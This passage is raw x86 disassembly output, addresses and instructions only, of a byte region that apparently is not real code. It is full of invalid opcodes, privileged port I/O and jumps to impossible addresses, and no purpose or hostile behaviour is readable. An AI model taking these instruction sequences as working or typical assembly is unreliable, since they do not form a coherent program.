  4028d3:	test   eax,0x17e5f290
  4028d8:	iret   
  4028d9:	je     0x402900
  4028db:	(bad)
  4028de:	outs   dx,DWORD PTR ds:[esi]
  4028df:	test   al,0x7c
  4028e1:	sbb    BYTE PTR [esi-0x79],dl
  4028e4:	aam    0x30
  4028e6:	mov    edx,0x39a071c7
  4028eb:	dec    eax
  4028ec:	mov    gs,WORD PTR [edi]
  4028ee:	mov    ecx,0x8ebd8be4
  4028f3:	and    al,0xed
  4028f5:	mov    edx,DWORD PTR [esi+0x73]
  4028f8:	mov    BYTE PTR [esi+ecx*8+0x39],bh
  4028fc:	(bad)  
  4028fd:	xor    BYTE PTR [edi+0x59],ch
  402900:	sbb    DWORD PTR [esi],edi
  402902:	div    BYTE PTR [ebp-0x18a1c07]
  402908:	jmp    0x40295a
  40290a:	out    dx,al
  40290b:	sbb    eax,0xa96b6ee1
  402910:	pop    ds
  402911:	ins    BYTE PTR es:[edi],dx
  402912:	fwait
  402913:	xor    BYTE PTR [ebp+0x54],0xbf
  402917:	and    esi,DWORD PTR [ebp-0x70]
  40291a:	mov    esi,0xa52bdbd3
  40291f:	fisubr WORD PTR [ebp+ecx*8+0x4a4d6596]
  402926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402927:	mov    ds:0xf0360189,eax
  40292c:	inc    ebp
  40292d:	and    al,0x26
  40292f:	sahf   
  402930:	sbb    BYTE PTR [edx-0x58],bh
  402933:	lock or eax,0xf869467c
  402939:	test   al,0x23
  40293b:	sub    ebx,DWORD PTR [ebx+0x7c8abb73]
  402941:	xchg   ebp,eax
  402942:	cmc    
  402943:	and    al,0x8f
  402945:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  402947:	mov    ebx,ecx
  402949:	repz inc esp
  40294b:	nop
  40294c:	in     eax,dx
  40294d:	rcr    DWORD PTR gs:[edi],0x5f
  402951:	jmp    0x67217ffc
  402956:	dec    ebx
  402957:	dec    esi
  402958:	lahf   
  402959:	mov    ebp,ebp
  40295b:	in     eax,dx
  40295c:	pop    ds
  40295d:	scas   al,BYTE PTR es:[edi]
  40295e:	cwde   
  40295f:	and    DWORD PTR cs:[eax-0x76cd9454],ebx
  402966:	jg     0x402911
  402968:	dec    esp
  402969:	call   0x47d5f3be
  40296e:	add    BYTE PTR [esi+esi*1+0x5f11ac84],dh
  402975:	outs   dx,DWORD PTR ds:[esi]
  402976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402977:	int3   
  402978:	jno    0x40292c
  40297a:	lds    esi,FWORD PTR [esi-0x6]
  40297d:	icebp  
  40297e:	pop    edx
  40297f:	lds    eax,FWORD PTR [edi-0x1]
  402982:	call   0x91ebfd44
  402987:	xor    edi,esp
  402989:	xchg   esi,eax
  40298a:	js     0x402987
  40298c:	mov    ebx,0x2b4c8660
  402991:	fld    QWORD PTR [edi+0x7d584292]
  402997:	es push esp
  402999:	(bad)  
  40299a:	out    dx,eax
  40299b:	dec    ebp
  40299c:	int3   
  40299d:	mov    ?,WORD PTR [ecx+0x15ded569]
  4029a3:	dec    ebx
  4029a4:	rol    BYTE PTR [ebp-0x3cb6c084],cl
  4029aa:	xchg   DWORD PTR [eax+esi*1-0x2d],esp
  4029ae:	inc    edx
  4029af:	push   edx
  4029b0:	mov    ebx,0xdf371903
  4029b5:	push   es
  4029b6:	lods   eax,DWORD PTR ds:[esi]
  4029b7:	xlat   BYTE PTR ds:[ebx]
  4029b8:	inc    ebx
  4029b9:	adc    ebp,DWORD PTR ds:0x27fc651
  4029bf:	mov    eax,0xf77100af
  4029c4:	fcomp  QWORD PTR [edi-0x4ba37e8b]
  4029ca:	imul   esp,DWORD PTR [edi],0x57
  4029cd:	test   BYTE PTR [edi+0x69],dh
  4029d0:	iret   
  4029d1:	mov    dh,0xe5
  4029d3:	adc    al,0x15
  4029d5:	adc    BYTE PTR [edx-0x5a372f3c],cl
  4029db:	mov    ds:0x66515c9b,eax
  4029e0:	aas    
  4029e1:	imul   eax,DWORD PTR [edx],0xfffffff6
  4029e4:	retf   
  4029e5:	sub    al,0xf0
  4029e7:	jp     0x4029c9
  4029e9:	dec    ecx
  4029ea:	pop    ecx
  4029eb:	test   al,0xa5
  4029ed:	mov    ah,ch
  4029ef:	dec    ebp
  4029f0:	and    cl,ah
  4029f2:	push   es
  4029f3:	stos   BYTE PTR es:[edi],al
  4029f4:	xchg   esp,eax
  4029f5:	out    0x22,al
  4029f7:	xchg   DWORD PTR [ebx],ecx
  4029f9:	push   0x14
  4029fb:	jne    0x402a5c
  4029fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029fe:	dec    edx
  4029ff:	add    ebp,DWORD PTR [ebp*4+0x344d11e2]
  402a06:	jmp    0x6e4ae828
  402a0b:	inc    ebx
  402a0c:	fstp   TBYTE PTR [ebp-0xa8a00d1]
  402a12:	stos   DWORD PTR es:[edi],eax
  402a13:	or     BYTE PTR [ecx+0x8],0x1d
  402a17:	imul   eax,DWORD PTR [ecx],0xffffffc0
  402a1a:	jb     0x402a6b
  402a1c:	test   eax,0xb43e0697
  402a21:	jecxz  0x402a78
  402a23:	sbb    al,0xa8
  402a25:	cmp    BYTE PTR [esp+edx*2-0x7344df25],al
  402a2c:	call   0x4010:0xe636150a
  402a33:	scas   eax,DWORD PTR es:[edi]
  402a34:	sub    DWORD PTR ds:0xa1985e29,ecx
  402a3a:	mov    esi,0x6f52efc1
  402a3f:	sub    al,0x5a
  402a41:	sbb    BYTE PTR [ebx],0x62
  402a44:	clc    
  402a45:	jo     0x4029e3
  402a47:	or     ebx,0x4f
  402a4a:	push   0x9d6e5f90
  402a4f:	sub    ah,BYTE PTR [edi-0x7aad5434]
  402a55:	adc    BYTE PTR [ecx+0x72],ah
  402a58:	adc    DWORD PTR [eax],ecx
  402a5a:	push   ss
  402a5b:	daa    
  402a5c:	adc    eax,0xdf818ba2
  402a61:	into   
  402a62:	and    bh,BYTE PTR [edx+edx*2]
  402a65:	rol    eax,cl
  402a67:	pop    ebp
  402a68:	jmp    0x982:0xe7befdc4
  402a6f:	(bad)  
  402a70:	out    dx,al
  402a71:	enter  0x4f5c,0xae
  402a75:	sbb    edi,DWORD PTR [ebp-0xee2cbdd]
  402a7b:	outs   dx,BYTE PTR ds:[esi]
  402a7c:	mov    esp,0x2e7c3c5e
  402a81:	xchg   esi,eax
  402a83:	jne    0x402a27
  402a85:	fwait
  402a86:	inc    esp
  402a87:	sub    dh,cl
  402a89:	cmp    DWORD PTR [esi-0x1d201f08],edx
  402a8f:	mov    ecx,0x29183736
  402a94:	jns    0x402ab0
  402a96:	jg     0x402ade
  402a98:	cmp    esp,DWORD PTR [ecx]
  402a9a:	xchg   DWORD PTR [ebp+0x2b0ae10b],esi
  402aa0:	mov    ds:0xb7ee3602,al
  402aa5:	xchg   edi,eax
  402aa6:	mov    al,ds:0x946ce84c
  402aab:	jnp    0x402a34
  402aad:	push   ebp
  402aae:	xlat   BYTE PTR ds:[ebx]
  402aaf:	mov    ch,0x1
  402ab1:	inc    esp
  402ab2:	jecxz  0x402ae7
  402ab4:	inc    ebp
  402ab5:	or     eax,0xa7fdcbb4
  402aba:	push   esi
  402abb:	sub    eax,0xc8ba05fa
  402ac0:	mov    al,ds:0xac5db8ed
  402ac5:	ret    0x4f10
  402ac8:	in     eax,dx
  402ac9:	xor    al,0x51
  402acb:	das    
  402acc:	pushf  
  402acd:	dec    ebx
  402ace:	gs out dx,eax
  402ad0:	xor    DWORD PTR [eax],edi
  402ad2:	push   ebp
  402ad3:	xor    dh,BYTE PTR [eax+edi*8+0x2b]
  402ad7:	mov    ?,WORD PTR [ebp+edx*2-0x1c320d1a]
  402ade:	sub    al,0xed
  402ae0:	(bad)  
  402ae1:	sahf   
  402ae2:	add    esi,DWORD PTR [eax-0x7f]
  402ae5:	mov    ds:0xdab6ce6e,al
  402aea:	retf   
  402aeb:	cwde   
  402aec:	aaa    
  402aed:	jecxz  0x402adb
  402aef:	push   es
  402af0:	xchg   ecx,eax
  402af1:	push   edi
  402af2:	cmp    al,0x57
  402af4:	inc    esp
  402af5:	sub    eax,0x389e1f79
  402afa:	daa    
  402afb:	jbe    0x402b1d
  402afd:	sahf   
  402afe:	pop    eax
  402aff:	adc    ah,BYTE PTR [edi]
  402b01:	jb     0x402a90
  402b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b04:	adc    cl,BYTE PTR [edi-0x4f]
  402b07:	ja     0x402a9b
  402b09:	inc    esi
  402b0a:	out    0x8d,al
  402b0c:	pop    esi
  402b0d:	sbb    al,0x92
  402b0f:	cli    
  402b10:	fs mov ch,0x4b
  402b13:	xchg   esp,eax
  402b14:	scas   eax,DWORD PTR es:[edi]
  402b15:	fidiv  DWORD PTR [esi+0x61]
  402b18:	inc    eax
  402b19:	sub    bl,BYTE PTR [ebp+0x23b5bb81]
  402b1f:	cmp    ecx,DWORD PTR [edi-0x53dc5d41]
  402b25:	jg     0x402aa8
  402b27:	pop    edi
  402b28:	dec    esi
  402b29:	xchg   DWORD PTR [ecx+esi*2-0x3e],ecx
  402b2d:	aaa    
  402b2e:	adc    bh,BYTE PTR [ecx+ecx*1]
  402b31:	add    BYTE PTR [ebx],ah
  402b33:	in     al,dx
  402b34:	shr    BYTE PTR [ebp+ebp*2-0x5e],1
  402b38:	pop    es
  402b39:	in     eax,0xe
  402b3b:	sbb    eax,0x4521e424
  402b40:	data16 fsubr DWORD PTR [ebp+0x7a49f5f0]
  402b47:	hlt    
  402b48:	xchg   ebp,eax
  402b49:	(bad)  
  402b4a:	lock call 0x4c8d:0x2937a587
  402b52:	cmp    ebx,edx
  402b54:	or     ecx,DWORD PTR cs:[esi+0x61]
  402b58:	aaa    
  402b59:	push   0x7f38229a
  402b5e:	or     cl,dh
  402b60:	aam    0x2c
  402b62:	dec    ecx
  402b63:	sbb    BYTE PTR [eax-0x6b03c020],ah
  402b69:	or     ecx,DWORD PTR [edx+0x32016496]
  402b6f:	pop    edi
  402b70:	out    dx,eax
  402b71:	sub    BYTE PTR [edi-0xd],dl
  402b74:	gs pop ebp
  402b76:	mov    eax,ds:0xe5903655
  402b7b:	es (bad) 
  402b7d:	loope  0x402b19
  402b7f:	out    dx,eax
  402b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b81:	outs   dx,DWORD PTR ds:[esi]
  402b82:	mov    dl,0x2
  402b84:	(bad)  
  402b85:	(bad)  
  402b86:	clc    
  402b87:	fimul  WORD PTR [ebx+0x5]
  402b8a:	sti    
  402b8b:	jg     0x402bc5
  402b8d:	sub    bl,ah
  402b8f:	mov    ebp,DWORD PTR [edi+0x4f]
  402b92:	lea    edi,[eax-0x66]
  402b95:	sub    ah,bl
  402b97:	mov    esi,eax
  402b99:	dec    ecx
  402b9a:	fwait
  402b9b:	adc    BYTE PTR ds:0xdcb9a312,ah
  402ba1:	dec    ebp
  402ba2:	xchg   bh,al
  402ba4:	sbb    eax,0x7848518
  402ba9:	imul   ebp,DWORD PTR [esp],0xfffffff4
  402bad:	inc    eax
  402bae:	stc    
  402baf:	add    DWORD PTR [edi+edx*1],edi
  402bb2:	clc    
  402bb3:	js     0x402ba4
  402bb5:	repz repz xchg bl,dh
  402bb9:	jmp    0x6db2:0xca9ce701
  402bc0:	jg     0x402b86
  402bc2:	jecxz  0x402b66
  402bc4:	dec    ecx
  402bc5:	sub    DWORD PTR [ecx-0x58c0a3a9],ebp
  402bcb:	stos   DWORD PTR es:[edi],eax
  402bcc:	dec    ebp
  402bcd:	mov    dl,0xa3
  402bcf:	(bad)  
  402bd0:	jbe    0x402b64
  402bd2:	enter  0x6a1e,0xcd
  402bd6:	jmp    0x402b5b
  402bd8:	fadd   QWORD PTR [ebx+0x202bf5d4]
  402bde:	sbb    DWORD PTR [edi+eiz*2+0x5a],esi
  402be2:	mov    dh,0x6f
  402be4:	test   BYTE PTR [edx-0x4a],bh
  402be7:	lds    ecx,FWORD PTR [ecx]
  402be9:	aam    0x7b
  402beb:	xor    al,0x1f
  402bed:	leave  
  402bee:	adc    al,0xf1
  402bf0:	stos   DWORD PTR es:[edi],eax
  402bf1:	sar    eax,cl
  402bf3:	xchg   ebp,eax
  402bf4:	jge    0x402bae
  402bf6:	dec    ebp
  402bf7:	les    ebp,FWORD PTR [ecx-0x4f]
  402bfa:	shl    DWORD PTR ds:0x6b2e5bc1,0xb3
  402c01:	enter  0x1e7d,0xdc
  402c05:	stos   DWORD PTR es:[edi],eax
  402c06:	mov    ah,0xb6
  402c08:	imul   ecx,DWORD PTR [edi],0x91a1a28e
  402c0e:	scas   eax,DWORD PTR es:[edi]
  402c0f:	xor    esp,esi
  402c11:	sbb    DWORD PTR [esi],ebx
  402c13:	and    BYTE PTR [esi],dh
  402c15:	sti    
  402c16:	mov    eax,0x8d7b4ffd
  402c1b:	hlt    
  402c1c:	gs push ebx
  402c1e:	movd   DWORD PTR [ecx-0x33],mm3
  402c22:	pusha  
  402c23:	mov    esp,0x1ccc8e60
  402c28:	push   ebp
  402c29:	xchg   ebp,esi
  402c2b:	xlat   BYTE PTR ds:[ebx]
  402c2c:	sub    BYTE PTR [eax],ch
  402c2e:	push   0x39
  402c30:	lahf   
  402c31:	mov    ecx,0x33a74d3b
  402c36:	into   
  402c37:	fidiv  DWORD PTR ds:0xfb7ba601
  402c3d:	inc    edi
  402c3e:	rcr    DWORD PTR [ecx-0x72],0xa0
  402c42:	nop
  402c43:	loopne 0x402c7e
  402c45:	fs dec esi
  402c47:	mov    bh,0x5b
  402c49:	mov    ebp,0x542d9d8e
  402c4e:	hlt    
  402c4f:	add    ebx,DWORD PTR [esi]
  402c51:	cs gs inc esp
  402c54:	(bad)  
  402c56:	cwde   
  402c57:	inc    ecx
  402c58:	cmp    al,0x42
  402c5a:	fidiv  DWORD PTR [ebp-0x5c]
  402c5d:	mov    esp,0xd6d62afd
  402c62:	adc    BYTE PTR [ebx+0x4b],ah
  402c65:	inc    edx
  402c66:	add    eax,0x12dea1b3
  402c6b:	inc    ebx
  402c6c:	mov    ah,0x1
  402c6e:	jl     0x402cea
  402c70:	addr16 in al,0x4d
  402c73:	ins    BYTE PTR es:[edi],dx
  402c74:	inc    edx
  402c75:	or     al,ch
  402c77:	les    edx,FWORD PTR [edx]
  402c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c7a:	dec    ebx
  402c7b:	out    dx,eax
  402c7c:	js     0x402c97
  402c7e:	sub    eax,0x8ea7f585
  402c83:	iret   
  402c84:	jl     0x402cbe
  402c86:	out    0xb0,eax
  402c88:	sbb    bl,BYTE PTR [ebx-0x61a6f2fe]
  402c8e:	fldenv [edx+0x2a]
  402c91:	out    dx,al
  402c92:	daa    
  402c93:	mov    BYTE PTR [ebx+0x42],cl
  402c96:	cs mov al,0x17
  402c99:	arpl   WORD PTR [edx],ax
  402c9b:	sub    eax,0x91697b46
  402ca0:	mov    ds:0xda37973d,al
  402ca5:	clc    
  402ca6:	ror    ebp,cl
  402ca8:	inc    eax
  402ca9:	(bad)  
  402caa:	pop    ebp
  402cab:	mov    dh,0xd
  402cad:	test   eax,0x19476c6e
  402cb2:	adc    DWORD PTR [edx-0x3ad1bb0c],ebp
  402cb8:	inc    ebx
  402cb9:	or     bh,BYTE PTR [ecx+0x15]
  402cbc:	sbb    dh,ah
  402cbe:	xchg   BYTE PTR [ebx+0x12],ah
  402cc1:	cmp    ah,0x14
  402cc4:	sub    edi,DWORD PTR [edi+0x2a4edd06]
  402cca:	jge    0x402c9c
  402ccc:	aad    0xf1
  402cce:	jle    0x402cdc
  402cd0:	xchg   esp,eax
  402cd1:	jmp    0x402c6f
  402cd3:	pop    esi
  402cd4:	mov    al,0x68
  402cd6:	das    
  402cd7:	enter  0x8da8,0x92
  402cdb:	lock dec eax
  402cdd:	sbb    ch,BYTE PTR [eax]
  402cdf:	and    al,0x5e
  402ce1:	jae    0x402cf1
  402ce3:	sbb    BYTE PTR [eax-0x3c],ah
  402ce6:	xor    eax,0xdbf25116
  402ceb:	mov    BYTE PTR [edx+0x61],ah
  402cee:	enter  0xb4c1,0x2e
  402cf2:	mov    esp,0x463e1358
  402cf7:	bswap  ebx
  402cf9:	inc    ecx
  402cfa:	mov    dl,0xb5
  402cfc:	mov    al,ds:0x88d24c3
  402d01:	mul    BYTE PTR [edx]
  402d03:	push   esi
  402d04:	jmp    0x402cd0
  402d06:	sbb    eax,0xaf11d257
  402d0b:	mov    al,ds:0xa054ec5
  402d10:	sbb    BYTE PTR [edx+0x6b],dl
  402d13:	je     0x402cc7
  402d15:	mov    ds:0x99613e5,eax
  402d1a:	popf   
  402d1b:	arpl   WORD PTR [edx],bx
  402d1d:	mov    ds:0xaad6916f,eax
  402d22:	mov    BYTE PTR [eax],al
  402d24:	mov    ds:0xb40e4403,eax
  402d29:	mov    ecx,0x9141813d
  402d2e:	call   0x8c56bb99
  402d33:	add    eax,0x52db3546
  402d38:	or     al,dl
  402d3a:	mov    DWORD PTR [edi-0x43],eax
  402d3d:	mov    cl,0x85
  402d3f:	scas   al,BYTE PTR es:[edi]
  402d40:	add    DWORD PTR [eax+0x1a],edx
  402d43:	xor    dl,BYTE PTR [edx-0x60]
  402d46:	into   
  402d47:	test   eax,0x987d60a7
  402d4c:	jo     0x402d40
  402d4e:	pop    ss
  402d4f:	outs   dx,DWORD PTR ds:[esi]
  402d50:	test   al,0x23
  402d52:	das    
  402d53:	dec    eax
  402d54:	repnz popa 
  402d56:	retf   
  402d57:	add    ebx,edi
  402d59:	dec    ecx
  402d5a:	fmulp  st(6),st
  402d5c:	xor    DWORD PTR [edi+edi*1+0x2e],0x77
  402d61:	jg     0x402dcb
  402d63:	adc    edi,DWORD PTR [ebx]
  402d65:	call   0xcddba3b9
  402d6a:	jae    0x402db6
  402d6c:	shl    ecx,cl
  402d6e:	scas   eax,DWORD PTR es:[edi]
  402d6f:	or     DWORD PTR [esi-0x39],0x75f4754
  402d76:	add    bh,dh
  402d78:	pop    ds
  402d79:	lock aaa 
  402d7b:	shr    bh,0x7e
  402d7e:	sbb    ebx,DWORD PTR [ecx]
  402d80:	and    DWORD PTR [edi+0xb1f22],edx
  402d86:	fisub  DWORD PTR ds:0xefaa3143
  402d8c:	push   0xffffff84
  402d8e:	fucomi st,st(2)
  402d90:	cmc    
  402d91:	jecxz  0x402dce
  402d93:	call   0x4db3e397
  402d98:	and    BYTE PTR [edx],ah
  402d9a:	(bad)  
  402d9b:	ins    BYTE PTR es:[edi],dx
  402d9c:	fstp   QWORD PTR [ebx+0x10]
  402d9f:	out    0x6d,eax
  402da1:	adc    al,0xf3
  402da3:	stos   DWORD PTR es:[edi],eax
  402da4:	in     eax,0x9c
  402da6:	fs repnz inc esi
  402da9:	cmc    
  402daa:	mov    BYTE PTR [esi-0x2a30417d],dh
  402db0:	jmp    0x8c0d:0x52e9774a
  402db7:	jae    0x402d48
  402db9:	arpl   sp,cx
  402dbb:	or     ebx,DWORD PTR [ecx]
  402dbd:	ja     0x402de0
  402dbf:	push   eax
  402dc0:	(bad)  
  402dc2:	je     0x402e1c
  402dc4:	loopne 0x402df9
  402dc6:	ret    0x904b
  402dc9:	cmp    DWORD PTR [edx],esi
  402dcb:	mov    ds:0xe94bd83e,eax
  402dd0:	inc    ebp
  402dd1:	fcmovb st,st(3)
  402dd3:	fdivr  DWORD PTR [ebp+0x102bd8c7]
  402dd9:	mov    esp,0x89747002
  402dde:	dec    ebp
  402ddf:	jl     0x402dd5
  402de1:	push   0x43a8cf18
  402de6:	loope  0x402df1
  402de8:	fistp  DWORD PTR [ecx]
  402dea:	test   cl,0x50
  402ded:	mov    dl,0x5c
  402def:	lock enter 0x29e1,0x1c
  402df4:	in     al,0x9f
  402df6:	daa    
  402df7:	retf   
  402df8:	adc    al,0xf6
  402dfa:	cmp    ah,BYTE PTR [eax]
  402dfc:	aas    
  402dfd:	pop    edi
  402dfe:	ret    
  402dff:	outs   dx,BYTE PTR ds:[esi]
  402e00:	sub    BYTE PTR [ebx],ah
  402e02:	xchg   BYTE PTR [ebx+0x67],al
  402e05:	mov    dl,0x7d
  402e07:	sub    DWORD PTR [eax+0x5df83083],ebp
  402e0d:	xor    al,0xbb
  402e0f:	lods   al,BYTE PTR ds:[esi]
  402e10:	mov    ds:0xd4c6ab5b,eax
  402e15:	pop    edi
  402e16:	inc    esi
  402e17:	xor    DWORD PTR [esp+edi*2],edi
  402e1a:	xchg   esp,eax
  402e1b:	cmp    DWORD PTR [esi-0x650bb130],esp
  402e21:	jl     0x402e5c
  402e23:	test   al,0xc5
  402e25:	and    BYTE PTR [esi+0x1bc704e3],dl
  402e2b:	lds    edi,FWORD PTR [ebp-0x4c]
  402e2e:	add    BYTE PTR [edi+esi*2+0x37495a86],0x9c
  402e36:	jae    0x402e61
  402e38:	inc    esp
  402e39:	push   ss
  402e3a:	imul   eax,edi,0xffffffd0
  402e3d:	jo     0x402e26
  402e3f:	push   cs
  402e40:	in     eax,dx
  402e41:	ins    DWORD PTR es:[edi],dx
  402e42:	mov    eax,0x6cfb8ccf
  402e47:	jno    0x402e57
  402e49:	xchg   esi,esp
  402e4b:	mov    ch,0x5b
  402e4d:	ins    BYTE PTR es:[edi],dx
  402e4e:	sbb    eax,edx
  402e50:	xor    esp,DWORD PTR [ebx]
  402e52:	add    esp,ebx
  402e54:	ins    DWORD PTR es:[edi],dx
  402e55:	push   ecx
  402e56:	lea    ecx,[esp+ebx*2]
  402e59:	outs   dx,BYTE PTR ds:[esi]
  402e5a:	cmp    ecx,eax
  402e5c:	mov    bl,0x74
  402e5e:	lods   eax,DWORD PTR ds:[esi]
  402e5f:	je     0x402e4c
  402e61:	iret   
  402e62:	cmc    
  402e63:	sbb    al,0xe3
  402e65:	shl    BYTE PTR [edx+esi*8+0xb],0x56
  402e6a:	outs   dx,DWORD PTR ds:[esi]
  402e6b:	mov    eax,ds:0x9667793b
  402e70:	inc    ebx
  402e71:	jp     0x402e54
  402e73:	(bad)  
  402e74:	int    0xf7
  402e76:	xchg   esp,eax
  402e77:	mov    al,0xd3
  402e79:	push   cs
  402e7a:	call   0x844c:0xc2f209b2
  402e81:	aaa    
  402e82:	push   ebp
  402e83:	xchg   ebp,eax
  402e84:	popf   
  402e85:	aaa    
  402e86:	js     0x402e5b
  402e88:	shr    dl,0xf4
  402e8b:	pop    esp
  402e8c:	loop   0x402e39
  402e8e:	push   0x2f
  402e90:	mov    ah,0x3
  402e92:	or     eax,0xdfaee71e
  402e97:	xor    DWORD PTR [eax+edx*4+0xd],0xecbed35c
  402e9f:	xor    ebx,esi
  402ea1:	mov    ebx,0x771dce79
  402ea6:	bound  edx,QWORD PTR [eax+0x587fdad3]
  402eac:	sub    al,0xa9
  402eae:	xchg   ecx,eax
  402eaf:	or     al,dl
  402eb1:	sub    eax,0xc12434f
  402eb6:	add    ecx,DWORD PTR [ecx]
  402eb8:	stc    
  402eb9:	mov    al,ds:0x12a0bdaf
  402ebe:	lea    edx,[ecx-0x3836a3e4]
  402ec4:	lea    esp,[edx]
  402ec6:	sbb    al,0x1e
  402ec8:	lahf   
  402ec9:	mov    esp,0xff6ad8b3
  402ece:	mov    edi,0xc8ed91f5
  402ed3:	pop    edx
  402ed4:	imul   edx,DWORD PTR [ebx-0x48],0x4
  402ed8:	out    0x9,al
  402eda:	jae    0x402f59
  402edc:	ficom  DWORD PTR [ebx-0x677e9213]
  402ee2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ee3:	int    0x70
  402ee5:	add    eax,0x9975767
  402eea:	push   ebp
  402eeb:	lahf   
  402eec:	sbb    DWORD PTR cs:[esi-0x65fcfd74],ecx
  402ef3:	cmp    eax,0x361671fd
  402ef8:	push   eax
  402ef9:	test   BYTE PTR [edi-0x76ebec0b],0xee
  402f00:	daa    
  402f01:	retf   
  402f02:	loop   0x402e87
  402f04:	sub    al,BYTE PTR [edi+0x38]
  402f07:	or     eax,0x9cdf669b
  402f0c:	je     0x402f50
  402f0e:	fs (bad) 
  402f10:	adc    dl,ch
  402f12:	mov    ah,0x96
  402f14:	jle    0x402efb
  402f16:	frstor [ecx-0x4b3b91b9]
  402f1c:	test   DWORD PTR [ebp-0x1b],ebp
  402f1f:	lea    edi,ds:0x87f0ef4e
  402f25:	retf   
  402f26:	test   edi,ebp
  402f28:	mov    WORD PTR [ecx],?
  402f2a:	call   0xe5e4329
  402f2f:	rcr    DWORD PTR [esi],0xfa
  402f32:	nop
  402f33:	fstp   DWORD PTR [ebp+ebp*8+0x830ff78]
  402f3a:	jb     0x402f92
  402f3c:	dec    edx
  402f3d:	retf   0x4ede
  402f40:	out    0xca,al
  402f42:	or     al,0x7e
  402f44:	cmp    esi,DWORD PTR [eax-0x3f]
  402f47:	rol    DWORD PTR [edi-0x19dc3149],0x19
  402f4e:	ss push ecx
  402f50:	dec    ebp
  402f51:	mov    edi,0x3769b59b
  402f56:	cmp    DWORD PTR [edx+0x32],esi
  402f59:	je     0x402ef8
  402f5b:	inc    ebp
  402f5c:	cmp    ch,dh
  402f5e:	push   0xffffffcb
  402f60:	mov    edi,0x4349798b
  402f65:	outs   dx,BYTE PTR ds:[esi]
  402f66:	dec    esp
  402f67:	mov    bl,0x85
  402f69:	daa    
  402f6a:	repz or ebp,edx
  402f6d:	add    bh,BYTE PTR [edx-0x4c]
  402f70:	imul   ebx,DWORD PTR [ebp-0x6ca815a7],0xa4b22e2a
  402f7a:	in     al,0x8a
  402f7c:	les    ebp,FWORD PTR [eax]
  402f7e:	ret    
  402f7f:	sbb    eax,0x8a396c2
  402f84:	repnz mov esi,DWORD PTR [edx+0x34]
  402f88:	ds mov ebp,0xddfe13a4
  402f8e:	xlat   BYTE PTR ds:[ebx]
  402f8f:	add    al,0xac
  402f91:	cld    
  402f92:	mov    cl,0x75
  402f94:	cmp    eax,esi
  402f96:	cmp    ebp,ebp
  402f98:	mov    dh,0xb2
  402f9a:	popf   
  402f9b:	sub    al,0x48
  402f9d:	and    ebx,0x80cac912
  402fa3:	in     al,dx
  402fa4:	adc    esi,0x68
  402fa7:	mov    esp,0x714a9b75
  402fac:	dec    ebx
  402fad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fae:	(bad)  
  402faf:	jl     0x402ff6
  402fb1:	push   esp
  402fb2:	mov    DWORD PTR [esi],edx
  402fb4:	and    eax,0xffffffa5
  402fb7:	mov    cl,al
  402fb9:	xchg   ebx,eax
  402fba:	gs or  eax,0x3209ae8f
  402fc0:	inc    ecx
  402fc1:	sti    
  402fc2:	cli    
  402fc3:	(bad)  
  402fc4:	sub    BYTE PTR fs:[ecx+ebp*8+0x12],0x63
  402fca:	and    DWORD PTR ds:0x65805335,ebp
  402fd0:	inc    ebp
  402fd1:	out    dx,al
  402fd2:	lods   al,BYTE PTR ds:[esi]
  402fd3:	fsubrp st(1),st
  402fd5:	mov    edx,0x70df4113
  402fda:	jmp    0x4b3a225e
  402fdf:	call   0xed98:0x2045904
  402fe6:	push   cs
  402fe7:	inc    edi
  402fe8:	jmp    0x933f9697
  402fed:	data16 adc al,BYTE PTR ds:0xeb6a034a
  402ff4:	and    esp,esi
  402ff6:	stc    
  402ff7:	sub    esp,DWORD PTR [ecx-0x21]
  402ffa:	sti    
  402ffb:	dec    ebp
  402ffc:	xor    al,cl
  402ffe:	imul   eax,DWORD PTR [edx-0x37],0xffffffa9
  403002:	push   cs
  403003:	push   0xc44990fd
  403008:	or     ah,dl
  40300a:	cmp    BYTE PTR [esp+ebp*8],bh
  40300d:	rol    BYTE PTR [esp+ecx*8-0x11d693c7],cl
  403014:	dec    edx
  403015:	sub    cl,BYTE PTR [esi+0x4a403ec1]
  40301b:	xchg   edi,eax
  40301c:	jae    0x403063
  40301e:	sbb    esi,DWORD PTR [ebx-0x43e69612]
  403024:	inc    esp
  403025:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403027:	lods   al,BYTE PTR ds:[esi]
  403028:	dec    ecx
  403029:	divps  xmm3,XMMWORD PTR [edi-0x10631e56]
  403030:	pop    ds
  403031:	adc    esi,DWORD PTR [edi]
  403033:	cld    
  403034:	sbb    ebp,DWORD PTR [ecx+0x70]
  403037:	xor    al,0x8
  403039:	xlat   BYTE PTR ds:[ebx]
  40303a:	adc    esi,DWORD PTR [ebx]
  40303c:	mov    esi,0xc8b5d2eb
  403041:	xor    eax,edx
  403043:	push   0x19755066
  403048:	add    al,0x48
  40304a:	scas   eax,DWORD PTR es:[edi]
  40304b:	mov    ch,0xfe
  40304d:	loopne 0x4030c3
  40304f:	add    DWORD PTR [ebp+0x3568441f],eax
  403055:	imul   edi,DWORD PTR [edx],0x740836d9
  40305b:	sbb    eax,0xdd9b111e
  403060:	or     al,0xf8
  403062:	add    al,0x3f
  403064:	stc    
  403065:	dec    edx
  403066:	xchg   ebp,eax
  403067:	add    cl,cl
  403069:	(bad)  
  40306a:	dec    esi
  40306b:	add    esp,DWORD PTR [ebx]
  40306d:	aam    0xcc
  40306f:	xor    esi,DWORD PTR [ebx-0x57b9125c]
  403075:	jae    0x403033
  403077:	(bad)  
  403078:	je     0x403021
  40307a:	mov    edi,0x2dc3bc24
  40307f:	(bad)  
  403080:	push   esi
  403081:	std    
  403082:	sbb    bh,ch
  403084:	retf   
  403085:	adc    eax,0x420dce9d
  40308a:	add    eax,0xd9b3e881
  40308f:	jle    0x40307a
  403091:	push   es
  403092:	sbb    DWORD PTR [eax],ebx
  403094:	dec    eax
  403095:	sbb    al,0xd6
  403097:	xchg   edx,eax
  403098:	push   esp
  40309a:	mov    ch,ah
  40309c:	jbe    0x403038
  40309e:	fs call 0xda391235
  4030a4:	jno    0x403041
  4030a6:	lahf   
